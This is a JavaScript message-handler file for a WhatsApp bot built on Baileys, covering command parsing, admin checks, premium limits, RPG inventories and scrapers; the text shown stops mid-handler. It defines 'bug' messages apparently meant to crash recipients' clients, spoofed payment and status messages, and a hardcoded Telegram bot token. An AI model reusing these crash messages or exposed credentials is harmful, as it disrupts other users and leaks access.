require("./lib/listmenu");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@whiskeysockets/baileys");
const os = require("os");
const fs = require("fs");
const fsx = require("fs-extra");
const path = require("path");
const util = require("util");
const { color } = require("./lib/color");
const chalk = require("chalk");
const moment = require("moment-timezone");
const cron = require("node-cron");
const speed = require("performance-now");
const ms = (toMs = require("ms"));
const axios = require("axios");
const fetch = require("node-fetch");
const yts = require("yt-search");
const gis = require("g-i-s");
const cheerio = require("cheerio");
const { randomBytes } = require("crypto");
const fg = require("api-dylux");
const googleTTS = require("google-tts-api");
const jsobfus = require("javascript-obfuscator");
const { translate } = require("@vitalets/google-translate-api");
const scp2 = require("./lib/scraper2");
const pkg = require("imgur");
const { ImgurClient } = pkg;
const client = new ImgurClient({ clientId: "a0113354926015a" });
const { exec, spawn, execSync } = require("child_process");
const { performance } = require("perf_hooks");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { Bitly, Tryurl } = "./lib/shortlink";
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime,
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar,
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  formatDate,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  json,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  fetchBuffer,
  buffergif,
  reSize,
  ucapan,
} = require("./assets/function/myfunc");
//prem owner function
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredPremiumCheck,
  checkPremiumUser,
  getAllPremiumUser,
} = require("./lib/premiun");
//data
let bad = JSON.parse(fs.readFileSync("./assets/bad.json"));
let premium = JSON.parse(
  fs.readFileSync("./assets/database/data/role/premium.json")
);
const owner = JSON.parse(
  fs.readFileSync("./assets/database/data/role/owner.json")
);

//function

//rpg function\\
const {
  addInventoriDarah,
  cekDuluJoinAdaApaKagaDiJson,
  addDarah,
  kurangDarah,
  getDarah,
} = require("./assets/database/user/darah.js");
const {
  cekInventoryAdaAtauGak,
  addInventori,
  addBesi,
  addEmas,
  addEmerald,
  addUmpan,
  addPotion,
  kurangBesi,
  kurangEmas,
  kurangEmerald,
  kurangUmpan,
  kurangPotion,
  getBesi,
  getEmas,
  getEmerald,
  getUmpan,
  getPotion,
} = require("./assets/database/user/alat_tukar.js");
const {
  addInventoriMonay,
  cekDuluJoinAdaApaKagaMonaynyaDiJson,
  addMonay,
  kurangMonay,
  getMonay,
} = require("./assets/database/user/monay.js");
const {
  addInventoriLimit,
  cekDuluJoinAdaApaKagaLimitnyaDiJson,
  addLimit,
  kurangLimit,
  getLimit,
} = require("./assets/database/user/limit.js");
const {
  cekDuluHasilBuruanNya,
  addInventoriBuruan,
  addIkan,
  addAyam,
  addKelinci,
  addDomba,
  addSapi,
  addGajah,
  kurangIkan,
  kurangAyam,
  kurangKelinci,
  kurangDomba,
  kurangSapi,
  kurangGajah,
  getIkan,
  getAyam,
  getKelinci,
  getDomba,
  getSapi,
  getGajah,
} = require("./assets/database/user/buruan.js");

//rpg database\\
let _limit = JSON.parse(fs.readFileSync("./assets/database/user/limit.json"));
let _buruan = JSON.parse(
  fs.readFileSync("./assets/database/user/hasil_buruan.json")
);
let _darahOrg = JSON.parse(
  fs.readFileSync("./assets/database/user/darah.json")
);

//media
const VoiceNoteXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/xeonvn.json")
);
const StickerXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/xeonsticker.json")
);
const ImageXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/xeonimage.json")
);
const VideoXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/xeonvideo.json")
);
const DocXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/doc.json")
);
const ZipXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/zip.json")
);
const ApkXeon = JSON.parse(
  fs.readFileSync("./OctopusBotzzMedia/database/apk.json")
);

//bug database
const { xeontext1 } = require("./assets/function/Bug/xeontext1");
const { xeontext2 } = require("./assets/function/Bug/xeontext2");
const { xeontext3 } = require("./assets/function/Bug/xeontext3");
const { xeontext4 } = require("./assets/function/Bug/xeontext4");
const { xeontext5 } = require("./assets/function/Bug/xeontext5");

const xeonverifieduser = JSON.parse(
  fs.readFileSync("./assets/database/data/role/user.json")
);

global.db.data = JSON.parse(fs.readFileSync("./assets/database.json"));
if (global.db.data)
  global.db.data = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {}),
  };

let vote = (db.data.others.vote = []);
let kuismath = (db.data.game.math = []);

//time
const xtime = moment.tz("Asia/Jakarta").format("HH:mm:ss");
const xdate = moment.tz("Asia/Jakarta").format("DD/MM/YYYY");
//module
module.exports = OctopusBotzz = async (OctopusBotzz, m, chatUpdate, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    //prefix 1
    var prefix = [".", "/"]
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : xprefix;
    const isCmd = body.startsWith(prefix, "");
    const isCmd2 = body.startsWith(prefix);
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const full_args = body.replace(command, "").slice(1).trim();
    const pushname = m.pushName || "No Name";
    const botNumber = await OctopusBotzz.decodeJid(OctopusBotzz.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    const sender = m.sender;
    const text = (q = args.join(" "));
    const from = m.key.remoteJid;
    const fatkuns = m.quoted || m;
    const quoted =
      fatkuns.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns.mtype == "templateMessage"
        ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
        : fatkuns.mtype == "product"
        ? fatkuns[Object.keys(fatkuns)[0]]
        : m.quoted
        ? m.quoted
        : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    //media
    const isMedia = /image|video|sticker|audio/.test(mime);
    const isImage = type == "imageMessage";
    const isVideo = type == "videoMessage";
    const isAudio = type == "audioMessage";
    const isDocument = type == "documentMessage";
    const isLocation = type == "locationMessage";
    const isContact = type == "contactMessage";
    const isSticker = type == "stickerMessage";
    const isText = type == "textMessage";
    const isQuotedText =
      type === "extendexTextMessage" && content.includes("textMessage");
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedLocation =
      type === "extendedTextMessage" && content.includes("locationMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedContact =
      type === "extendedTextMessage" && content.includes("contactMessage");
    const isQuotedDocument =
      type === "extendedTextMessage" && content.includes("documentMessage");
    //prefix 2
    const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix;
    const xeonybody = body.startsWith(pric);
    const isCommand = xeonybody
      ? body.replace(pric, "").trim().split(/ +/).shift().toLowerCase()
      : "";
    const sticker = [];
    //group
    const isGroup = m.key.remoteJid.endsWith("@g.us");
    const groupMetadata = m.isGroup
      ? await OctopusBotzz.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const isGroupOwner = m.isGroup
      ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender)
      : false;
    //anti media
    const isOctopusBotzzMedia = m.mtype;
    //user status
    const isUser = xeonverifieduser.includes(sender);
    const isCreator = [botNumber, ...owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const isPremium = isCreator || checkPremiumUser(m.sender, premium);
    expiredPremiumCheck(OctopusBotzz, m, premium);

    //theme sticker reply
    const XeonStickWait = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/wait.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickAdmin = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/admin.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickBotAdmin = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/botadmin.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickOwner = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/owner.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickGroup = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/group.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickPrivate = () => {
      let XeonStikRep = fs.readFileSync(
        "./OctopusBotzzMedia/theme/sticker_reply/private.webp"
      );
      OctopusBotzz.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    //premium
    async function replyprem(teks) {
      replyLinkGc(
        `This feature is for premium user, contact the owner to become premium user`
      );
    }
    //script replier
    async function sendOctopusBotzzMessage(chatId, message, options = {}) {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await OctopusBotzz.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    }
    //reply
    async function replyLinkGc(teks) {
      if (typereply === "v1") {
        m.reply(teks);
      } else if (typereply === "v2") {
        OctopusBotzz.sendMessage(
          m.chat,
          {
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                previewType: "PHOTO",
                thumbnail: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                sourceUrl: wagc,
              },
            },
            text: teks,
          },
          {
            quoted: m,
          }
        );
      } else if (typereply === "v3") {
        OctopusBotzz.sendMessage(
          m.chat,
          {
            text: teks,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          { quoted: m }
        );
      }
    }

    //fake bug
    const fbug2 = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: `${xeontext1}`,
          caption: `${xeontext1}`,
          jpegThumbnail: thumb,
        },
      },
    };
    let fbug = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: `${xeontext3}`,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "999999999",
          height: 999999999,
          width: 999999999,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(thumb, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    //end fbug

    let fstatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: botname,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(thumb, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };

    //Fake quoted
    const fpay = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: global.botname,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: { text: global.botname },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "USD",
          },
        },
      },
    };
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          itemCount: 2022,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: botname,
          orderTitle: ownername,
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        documentMessage: { title: botname, jpegThumbnail: thumb },
      },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          gifPlayback: "true",
          caption: ownername,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net",
      },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: wm,
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { locationMessage: { name: wm, jpegThumbnail: thumb } },
    };
    const fkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: ownername,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6281359391296:6281359391296\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
          jpegThumbnail: thumb,
          thumbnail: thumb,
          sendEphemeral: true,
        },
      },
    };
    const fakestatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: wm,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    const frpayment = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: `${ownername}`,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: `${botname}`,
            },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "INR",
          },
        },
      },
    };

    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    //database
    try {
      let isNumber = (x) => typeof x === "number" && !isNaN(x);
      let limitUser = isPremium ? 100 : 19;
      let user = global.db.data.users[sender];
      if (typeof user !== "object") global.db.data.users[sender] = {};
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("badword" in user)) user.badword = 0;
        if (!("title" in user)) user.title = "";
        if (!("serialNumber" in user))
          user.serialNumber = randomBytes(16).toString("hex");
        if (!("afkReason" in user)) user.afkReason = "";
        if (!("nick" in user)) user.nick = OctopusBotzz.getName(sender);
        if (!isPremium) user.premium = false;
        if (!("totalLimit" in user)) user.totalLimit = 0;
        if (!isNumber(user.limit)) user.limit = limitUser;
      } else
        global.db.data.users[sender] = {
          serialNumber: randomBytes(16).toString("hex"),
          title: `${isPremium ? "Premium" : "User"}`,
          afkTime: -1,
          badword: 0,
          afkReason: "",
          nick: OctopusBotzz.getName(sender),
          premium: `${isPremium ? "true" : "false"}`,
          limit: limitUser,
          totalLimit: 0,
        };

      let chats = global.db.data.chats[from];
      if (typeof chats !== "object") global.db.data.chats[from] = {};
      if (chats) {
        if (!("badword" in chats)) chats.badword = false;
        if (!("antiforeignnum" in chats)) chats.antiforeignnum = false;
        if (!("antibot" in chats)) chats.antibot = false;
        if (!("antiviewonce" in chats)) chats.antiviewonce = false;
        if (!("antimedia" in chats)) chats.media = false;
        if (!("antivirtex" in chats)) chats.antivirtex = false;
        if (!("antiimage" in chats)) chats.antiimage = false;
        if (!("antivideo" in chats)) chats.video = false;
        if (!("antiaudio" in chats)) chats.antiaudio = false;
        if (!("antipoll" in chats)) chats.antipoll = false;
        if (!("antisticker" in chats)) chats.antisticker = false;
        if (!("anticontact" in chats)) chats.anticontact = false;
        if (!("antilocation" in chats)) chats.antilocation = false;
        if (!("antidocument" in chats)) chats.antidocument = false;
        if (!("antilink" in chats)) chats.antilink = false;
        if (!("antilinkgc" in chats)) chats.antilinkgc = false;
      } else
        global.db.data.chats[from] = {
          badword: false,
          antiforeignnum: false,
          antibot: false,
          antiviewonce: false,
          antivirtex: false,
          antimedia: false,
          antiimage: false,
          antivideo: false,
          antiaudio: false,
          antipoll: false,
          antisticker: false,
          antilocation: false,
          antidocument: false,
          anticontact: false,
          antilink: false,
          antilinkgc: false,
        };

      let setting = global.db.data.settings[botNumber];
      if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
      if (setting) {
        if (!("totalhit" in setting)) setting.totalhit = 0;
        if (!("totalError" in setting)) setting.totalError = 0;
        if (!("online" in setting)) setting.online = false;
        if (!("autosticker" in setting)) setting.autosticker = false;
        if (!("autobio" in setting)) setting.autobio = false;
        if (!("autoread" in setting)) setting.autoread = false;
        if (!("autorecordtype" in setting)) setting.autorecordtype = false;
        if (!("autorecord" in setting)) setting.autorecord = false;
        if (!("autotype" in setting)) setting.autotype = false;
        if (!("autoblocknum" in setting)) setting.autoblocknum = false;
        if (!("onlyindia" in setting)) setting.onlyindia = false;
        if (!("onlyindo" in setting)) setting.onlyindo = false;
        if (!("onlygrub" in setting)) setting.onlygrub = false;
        if (!("onlypc" in setting)) setting.onlypc = false;
        if (!("watermark" in setting)) setting.watermark = { packname, author };
        if (!("about" in setting))
          setting.about = {
            bot: {
              nick: OctopusBotzz.getName(botNumber),
              alias: botname,
            },
            owner: {
              nick: OctopusBotzz.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          };
      } else
        global.db.data.settings[botNumber] = {
          totalhit: 0,
          totalError: 0,
          online: false,
          autosticker: false,
          autobio: false,
          autoread: true,
          autoblocknum: false,
          onlyindia: false,
          onlyindo: false,
          onlygrub: false,
          onlypc: false,
          autorecordtype: false,
          autorecord: false,
          autotype: false,
          watermark: {
            packname: global.packname,
            author: global.author,
          },
          about: {
            bot: {
              nick: OctopusBotzz.getName(botNumber),
              alias: botname,
            },
            owner: {
              nick: OctopusBotzz.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          },
        };
    } catch (err) {
      console.log(err);
    }

    //photo uploader
    async function uploadtoimgur(imagepath) {
      try {
        const response = await client.upload({
          image: fs.createReadStream(imagepath),
          type: "stream",
        });

        let url = response.data.link;
        console.log(url);
        return url;
      } catch (error) {
        console.error("Error uploading image to Imgur:", error);
        throw error;
      }
    }

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }

    //bug loading
    async function loading() {
      var xeonlod = [
        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
        "《 ████▒▒▒▒▒▒▒▒》30%",
        "《 ███████▒▒▒▒▒》50%",
        "《 ██████████▒▒》80%",
        "《 ████████████》100%",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄...",
      ];
      let { key } = await OctopusBotzz.sendMessage(from, {
        text: "ʟᴏᴀᴅɪɴɢ...",
      });

      for (let i = 0; i < xeonlod.length; i++) {
        await OctopusBotzz.sendMessage(from, {
          text: xeonlod[i],
          edit: key,
        });
      }
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }

    async function styletext(teks) {
      return new Promise((resolve, reject) => {
        axios
          .get("http://qaz.wtf/u/convert.cgi?text=" + teks)
          .then(({ data }) => {
            let $ = cheerio.load(data);
            let hasil = [];
            $("table > tbody > tr").each(function (a, b) {
              hasil.push({
                name: $(b).find("td:nth-child(1) > span").text(),
                result: $(b).find("td:nth-child(2)").text().trim(),
              });
            });
            resolve(hasil);
          });
      });
    }

    async function Telesticker(url) {
      return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
          return replyLinkGc("Enther your url telegram sticker link");
        packName = url.replace("https://t.me/addstickers/", "");
        data = await axios(
          `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(
            packName
          )}`,
          { method: "GET", headers: { "User-Agent": "GoogleBot" } }
        );
        const xeonyresult = [];
        for (let i = 0; i < data.data.result.stickers.length; i++) {
          fileId = data.data.result.stickers[i].thumb.file_id;
          data2 = await axios(
            `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`
          );
          result = {
            status: 200,
            author: "DGXeon",
            url:
              "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
              data2.data.result.file_path,
          };
          xeonyresult.push(result);
        }
        resolve(xeonyresult);
      });
    }

    //limit func
    async function useLimit(senuseLimitder, amount) {
      db.data.users[sender].limit -= amount;
      db.data.users[sender].totalLimit += amount;
      replyLinkGc(
        `You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`
      );
    }
    async function resetLimit() {
      let users = Object.keys(global.db.data.users);
      let Limitxeon = isPremium ? limit.prem : limit.free;
      for (let i of users) {
        db.data.users[i].limit = Limitxeon;
      }
      OctopusBotzz.sendText("120363167338947238@g.us", {
        text: `Reset Limit`,
      });
    }
    // Grup Only
    if (!m.isGroup && !isCreator && db.data.settings[botNumber].onlygrub) {
      if (isCommand) {
        return replyLinkGc(
          `Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`
        );
      }
    }
    // Private Only
    if (!isCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
      if (isCommand) {
        return replyLinkGc(
          "Hello buddy! if you want to use this bot, please chat the bot in private chat"
        );
      }
    }

    if (global.publik) {
      OctopusBotzz.public = true;
    } else {
      OctopusBotzz.public = false;
    }

    if (global.autoread) {
      db.data.settings[botNumber].autoread = true;
    } else {
      db.data.settings[botNumber].autoread = false;
    }

    if (!OctopusBotzz.public) {
      if (isCreator && !m.key.fromMe) return;
    }
    if (db.data.settings[botNumber].online) {
      if (isCommand) {
        OctopusBotzz.sendPresenceUpdate("unavailable", from);
      }
    }
    if (db.data.settings[botNumber].autoread) {
      OctopusBotzz.readMessages([m.key]);
    }
    //auto set bio\\
    if (db.data.settings[botNumber].autobio) {
      OctopusBotzz.updateProfileStatus(
        `${botname} Have Been Running For ${runtime(process.uptime())}`
      ).catch((_) => _);
    }
    //auto type record
